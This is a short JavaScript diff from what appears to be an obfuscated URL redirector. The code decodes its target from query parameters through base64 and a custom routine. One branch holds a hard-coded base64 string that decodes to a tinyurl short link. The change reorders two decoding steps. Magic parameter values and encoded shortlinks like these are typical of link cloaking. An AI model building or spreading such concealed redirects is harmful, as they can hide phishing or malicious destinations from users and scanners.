@@ -12,7 +12,8 @@ if(p.get('i')==='bzd'){
 u=ud(bd('aHR0cHMlM0ElMkYlMkZ0aW55dXJsLmNvbSUyRjN2NWszeHl0',1),1);
 }else if(p.get('u')==='ska'){
 var v=p.get('v')||'',m=parseInt(p.get('m'))||0;
-u=ud(atob(v),m);
+v=ud(v,m);
+u=atob(v);
 }else{
 var a=p.get('a')||p.get('j')||p.get('f')||'';
 var d=parseInt(p.get('d')||p.get('k')||p.get('n'))||0;
